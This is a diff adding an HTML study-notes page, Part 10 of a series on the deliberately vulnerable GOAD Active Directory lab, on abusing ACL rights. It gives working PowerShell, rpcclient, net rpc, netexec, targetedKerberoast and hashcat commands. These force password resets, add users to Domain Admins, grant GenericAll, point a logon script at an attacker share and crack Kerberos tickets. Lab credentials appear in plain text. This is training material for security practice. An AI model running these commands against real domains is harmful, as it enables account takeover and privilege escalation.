@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GOAD Part 10 - ACL | Mr Stark Study Notes</title>
+
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  
+  <style>
+    .goad-content {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    
+    .goad-content h2 {
+      color: var(--orange-yellow-crayola);
+      font-size: var(--fs-2);
+      margin: 30px 0 15px 0;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--jet);
+    }
+    
+    .goad-content h3 {
+      color: var(--white-1);
+      font-size: var(--fs-3);
+      margin: 25px 0 10px 0;
+    }
+    
+    .goad-content h4 {
+      color: var(--white-2);
+      font-size: var(--fs-4);
+      margin: 20px 0 10px 0;
+    }
+    
+    .goad-content p {
+      color: var(--light-gray);
+      margin-bottom: 15px;
+      line-height: 1.8;
+    }
+    
+    .goad-content code {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9em;
+    }
+    
+    .goad-content pre {
+      background: var(--eerie-black-2);
+      border: 1px solid var(--jet);
+      border-radius: 8px;
+      padding: 15px;
+      overflow-x: auto;
+      margin: 15px 0;
+    }
+    
+    .goad-content pre code {
+      background: transparent;
+      color: var(--light-gray);
+      padding: 0;
+    }
+    
+    .goad-content img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin: 20px 0;
+      border: 1px solid var(--jet);
+    }
+    
+    .goad-content strong {
+      color: var(--white-2);
+    }
+  </style>
+</head>
+
+<body>
+
+  <main>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" data-sidebar>
+
+      <div class="sidebar-info">
+
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png" alt="Mr Stark" width="80">
+        </figure>
+
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">Part 10: ACL</p>
+        </div>
+
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+
+      </div>
+
+      <div class="sidebar-info_more">
+
+        <div class="separator"></div>
+
+        <ul class="contacts-list">
+
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-back-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Previous</p>
+              <a href="part-9-delegations.html" class="contact-link">Part 9</a>
+            </div>
+          </li>
+
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-forward-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Next</p>
+              <a href="part-11-trusts.html" class="contact-link">Part 11</a>
+            </div>
+          </li>
+
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="list-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">All Parts</p>
+              <a href="index.html" class="contact-link">GOAD Overview</a>
+            </div>
+          </li>
+
+        </ul>
+
+        <div class="separator"></div>
+
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+
+      </div>
+
+    </aside>
+
+    <div class="main-content">
+
+      <nav class="navbar">
+        <ul class="navbar-list">
+          <li class="navbar-item">
+            <button class="navbar-link  active" data-nav-link>Part 10</button>
+          </li>
+        </ul>
+      </nav>
+
+      <article class="about active" data-page="about">
+
+        <header class="h2 article-title">ACL</header>
+
+        <section class="about-text goad-content">
+
+
+
+
+
+<p>Access privileges for resources in Active Directory Domain Services are usually granted through the use of an Access Control Entry (ACE). Access Control Entries describe the allowed and denied permissions for a principal (e.g. user, computer account) in Active Directory against a securable object (user, group, computer, container, organizational unit (OU), GPO and so on)</p>
+<p>If an object's (called objectA) DACL features an ACE stating that another object (called objectB) has a specific right (e.g. GenericAll) over it (i.e. over objectA), attackers need to be in control of objectB to take control of objectA. </p>
+<p>The following abuses can only be carried out when running commands as the user mentioned in the ACE (objectB)</p>
+<img src="./game-of-active-directory/part-10-acl/images/screenshot_1.png" alt="">
+
+
+<p>GenericAll Rights on User</p>
+<p>This privilege grants an attacker full control over a target user account. Once GenericAll rights are confirmed using the Get-ObjectAcl command, an attacker can:</p>
+<p>* Change the Target's Password: Using net user <username> <password> /domain, the attacker can reset the user's password.</p>
+<p>* Targeted Kerberoasting: Assign an SPN to the user's account to make it kerberoastable, then use Rubeus and targetedKerberoast.py to extract and attempt to crack the ticket-granting ticket (TGT) hashes.</p>
+<p>* Targeted ASREPRoasting: Disable pre-authentication for the user, making their account vulnerable to ASREPRoasting.</p>
+
+<p>GenericAll Rights on Group</p>
+<p>This privilege allows an attacker to manipulate group memberships if they have GenericAll rights on a group like Domain Admins. After identifying the group's distinguished name with Get-NetGroup, the attacker can:</p>
+<p>* Add Themselves to the Domain Admins Group: This can be done via direct commands or using modules like Active Directory or PowerSploit.</p>
+
+<p>GenericAll / GenericWrite / Write on Computer/User</p>
+<p>* Holding these privileges on a computer object or a user account allows for:</p>
+<p>* Kerberos Resource-based Constrained Delegation: Enables taking over a computer object.</p>
+<p>* Shadow Credentials: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials.</p>
+
+<p>WriteProperty on Group</p>
+<p>If a user has WriteProperty rights on all objects for a specific group (e.g., Domain Admins), they can:</p>
+<p>Add Themselves to the Domain Admins Group: Achievable via combining net user and Add-NetGroupUser commands, this method allows privilege escalation within the domain.</p>
+
+<p>Self (Self-Membership) on Group</p>
+<p>This privilege enables attackers to add themselves to specific groups, such as Domain Admins, through commands that manipulate group membership directly. </p>
+<p>Using the following command sequence allows for self-addition:</p>
+<p>net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain</p>
+
+
+<p>WriteProperty (Self-Membership)</p>
+<p>A similar privilege, this allows attackers to directly add themselves to groups by modifying group properties if they have the WriteProperty right on those groups. </p>
+<p>The confirmation and execution of this privilege are performed with:</p>
+<p>Get-ObjectAcl -ResolveGUIDs | ? {$.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $.IdentityReference -eq "OFFENSE\spotless"}</p>
+<p>net group "domain admins" spotless /add /domain</p>
+
+
+<p>ForceChangePassword</p>
+<p>Holding the ExtendedRight on a user for User-Force-Change-Password allows password resets without knowing the current password. Verification of this right and its exploitation can be done through PowerShell or alternative</p>
+<p>command-line tools, offering several methods to reset a user's password, including interactive sessions and one-liners for non-interactive environments. </p>
+<p>The commands range from simple PowerShell invocations to using rpcclient on Linux, demonstrating the versatility of attack vectors.</p>
+<p>Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}</p>
+<p>Set-DomainUserPassword -Identity delegate -Verbose</p>
+<p>Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose</p>
+
+<p>rpcclient -U KnownUsername 10.10.10.192 setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'</p>
+
+<h4>WriteOwner on Group</h4>
+
+<p>If an attacker finds that they have WriteOwner rights over a group, they can change the ownership of the group to themselves. This is particularly impactful when the group in question is Domain Admins, as changing ownership allows for broader control over group attributes and membership. The process involves identifying the correct object via Get-ObjectAcl and then using Set-DomainObjectOwner to modify the owner, either by SID or name.</p>
+<p>Get-ObjectAcl -ResolveGUIDs | ? {$.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $.IdentityReference -eq "OFFENSE\spotless"}</p>
+<p>Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose</p>
+<p>Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico</p>
+
+<h4>GenericWrite on User</h4>
+
+<p>This permission allows an attacker to modify user properties. Specifically, with GenericWrite access, the attacker can change the logon script path of a user to execute a malicious script upon user logon. </p>
+<p>This is achieved by using the Set-ADObject command to update the scriptpath property of the target user to point to the attacker's script.</p>
+<p>Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1”</p>
+
+<h4>GenericWrite on Computer</h4>
+
+<p>With GenericWrite over a computer, you can write to the “msds-KeyCredentialLink” attribute. Writing to this property allows an attacker to create “Shadow Credentials” on the object and authenticate as the principal using Kerberos PKINIT. See more information under the AddKeyCredentialLink edge.</p>
+<p>Alternatively, you can perform a resource-based constrained delegation attack against the computer.</p>
+
+<p>GenericWrite on Group</p>
+<p>With this privilege, attackers can manipulate group membership, such as adding themselves or other users to specific groups. This process involves creating a credential object, using it to add or remove users from a group, and verifying the membership changes with PowerShell commands.</p>
+<p>$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force</p>
+<p>$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)</p>
+<p>Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose</p>
+<p>Get-DomainGroupMember -Identity "Group Name" | Select MemberName</p>
+<p>Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose</p>
+
+
+<p>WriteDACL + WriteOwner</p>
+<p>Owning an AD object and having WriteDACL privileges on it enables an attacker to grant themselves GenericAll privileges over the object. This is accomplished through ADSI manipulation, allowing for full control over the object and the ability to modify its group memberships. Despite this, limitations exist when trying to exploit these privileges using the Active Directory module's Set-Acl / Get-Acl cmdlets.</p>
+<p>$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"</p>
+<p>$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])</p>
+<p>$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"</p>
+<p>$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)</p>
+<p>$ADSI.psbase.commitchanges()</p>
+
+
+<p>Replication on the Domain (DCSync)</p>
+<p>The DCSync attack leverages specific replication permissions on the domain to mimic a Domain Controller and synchronize data, including user credentials. </p>
+<p>This powerful technique requires permissions like DS-Replication-Get-Changes, allowing attackers to extract sensitive information from the AD environment without direct access to a Domain Controller.</p>
+
+
+
+
+<h4>Practice</h4>
+
+<p>Let’s start by configuring the lab so we can do some ACL Abuses.</p>
+<pre><code>sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-data.yml
+sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-acl.yml
+sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-relations.yml
+sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook vulnerabilities.yml
+</code></pre>
+
+
+
+<img src="./game-of-active-directory/part-10-acl/images/screenshot_2.png" alt="">
+
+
+
+<h2>Enumeration</h2>
+
+<p>Enumerating ACLs with Bloodhound-python UNIX-like</p>
+<p>Once we do have a valid user, we can use Bloodhound to enumerate.</p>
+<p>bloodhound-python -c all -u 'tywin.lannister@sevenkingdoms.local' -p 'powerkingftw135' -ns 10.4.10.10 -d sevenkingdoms.local -dc kingslanding.sevenkingdoms.local</p>
+<img src="./game-of-active-directory/part-10-acl/images/screenshot_3.png" alt="">
+
+
+<p>Now let’s upload this information into Bloodhound and analyze it.</p>
+<h4>Analysis</h4>
+
+<p>we can use the following filter to find ACL configurations.</p>
+<p>MATCH p=(u)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' and u.admincount=false and not tolower(u.name) contains 'key' RETURN p</p>
+
+<h3>sevenkingdoms.local ACL</h3>
+
+<p>To start we will focus on the sevenkingdoms killchain of ACL by starting with tywin.lannister (password: powerkingftw135)</p>
+<p>The path here is :</p>
+<img src="./game-of-active-directory/part-10-acl/images/screenshot_4.png" alt="">
+
+
+<p>Above we can see see all the rights each user hash to other and we will start by exploiting each permission during this lab.</p>
+<p>NOTE: Abusing ACL make change on the targets. Be sure to you know what you are doing if you try to exploit it during an audit.</p>
+
+
+<h2>ForceChangePassword on User (Tywin -> Jaime)</h2>
+
+<p>It’s important to understand that this should be conducted carefully since this will change the user password that we do have permission to change password and user may get blocked since his password will be changed.</p>
+<img src="./game-of-active-directory/part-10-acl/images/screenshot_5.png" alt="">
+
+
+<p>As we can see above, user tywin.lannister has ForceChangePassword right to user jaime.lannister, let’s take advantage of this right.</p>
+
+<p>We execute the command and we get the prompt to add the new password. After that we can test the login with the new password on user jaime.lannister.</p>
+<p>net rpc password jaime.lannister -U 'sevenkingdoms.local/tywin.lannister%powerkingftw135' -S kingslanding.sevenkingdoms.local</p>
+<p>netexec smb 10.4.10.10 -u jaime.lannister -p 'pasdebraspasdechocolat' -d sevenkingdoms.local </p>
+<img src="./game-of-active-directory/part-10-acl/images/screenshot_6.png" alt="">
+
+
+<p>Above we can see that were able to change user jaime.lannister’s password, testing login to the server using NetExec.</p>
+
+
+<h2>GenericWrite on User (Jaime -> Joffrey)</h2>
+
+<p>Previously we were able to get access to user Jaime exploring ForceChangePassword right. the next step is to do an horizontal privilege escalation exploring GenericWrite from user Jaime to user Joffrey.</p>
+<img src="./game-of-active-directory/part-10-acl/images/screenshot_7.png" alt="">
+
+
+
+<p>Shadow Credentials (Windows Server 2016 +)</p>
+<p> Logon Script</p>
+<p>Targeted Kerberoasting (Normally the password has to be weak enough for the hash to be cracked or you really need to have a good wordlist)</p>
+
+
+<h4>Targeted Kerberoasting</h4>
+
+<p>This abuse can be carried out when controlling an object that has a GenericAll, GenericWrite, WriteProperty or Validated-SPN over the target. </p>
+<p>A member of the Account Operator group usually has those permissions.</p>
+<p>The attacker can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to Kerberoasting.</p>
+<p>The principle is simple. Add an SPN(Service Principal Name) to the user, ask for a (TGS)Ticket Granting Service, remove the SPN(Service Principal Name) on the user.</p>
+<p>targetedKerberoast.py -v -d sevenkingdoms.local -u 'jaime.lannister' -p 'pasdebraspasdechocolat' --request-user 'joffrey.baratheon'</p>
+<img src="./game-of-active-directory/part-10-acl/images/screenshot_8.png" alt="">
+
+
+<p>Once the Kerberoast hash is obtained, it can possibly be cracked to recover the account's password if the password used is weak enough.</p>
+
+<p>Now we can get the TGS and try to crack it using Hashcat.</p>
+<p>hashcat -m 13100 -a 0 TGS_hash.txt /usr/share/wordlists/rockyou.txt --force</p>
+
+<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); display: flex; justify-content: space-between;">
+  <a href="part-9-delegations.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">← Previous: Part 9</a>
+  <a href="part-11-trusts.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">Next: Part 11 →</a>
+</div>
+
+        </section>
+
+      </article>
+
+    </div>
+
+  </main>
+
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+</body>
+
+</html>
